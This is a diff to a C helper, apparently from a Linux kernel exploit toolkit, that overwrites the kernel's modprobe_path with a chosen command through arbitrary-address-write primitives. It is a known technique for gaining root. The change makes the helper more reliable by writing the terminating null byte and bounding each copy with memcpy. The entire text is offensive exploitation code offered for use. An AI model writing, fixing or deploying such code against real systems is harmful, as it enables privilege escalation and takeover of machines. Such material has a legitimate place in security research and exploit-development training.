@@ -16,14 +16,20 @@ void overwrite_modprobe_path(const char *const cmd, void (*aaw32)(void *, u32),
         puts("[-] please implement aaw function");
         return;
     }
-    const u64 len = strlen(cmd);
+    const u64 len = strlen(cmd) + 1;
     if (likely(aaw32 != NULL)) {
         for (u64 i = 0; i < len; i += 4) {
-            aaw32((void *)addr_modprobe_path + i, *(u32 *)&cmd[i]);
+            u32 val = 0;
+            const u64 n = MIN(len - i, 4);
+            memcpy(&val, cmd + i, n);
+            aaw32((void *)addr_modprobe_path + i, val);
         }
     } else if (aaw64 != NULL) {
         for (u64 i = 0; i < len; i += 8) {
-            aaw64((void *)addr_modprobe_path + i, *(u64 *)&cmd[i]);
+            u64 val = 0;
+            const u64 n = MIN(len - i, 8);
+            memcpy(&val, cmd + i, n);
+            aaw64((void *)addr_modprobe_path + i, val);
         }
     }
 }
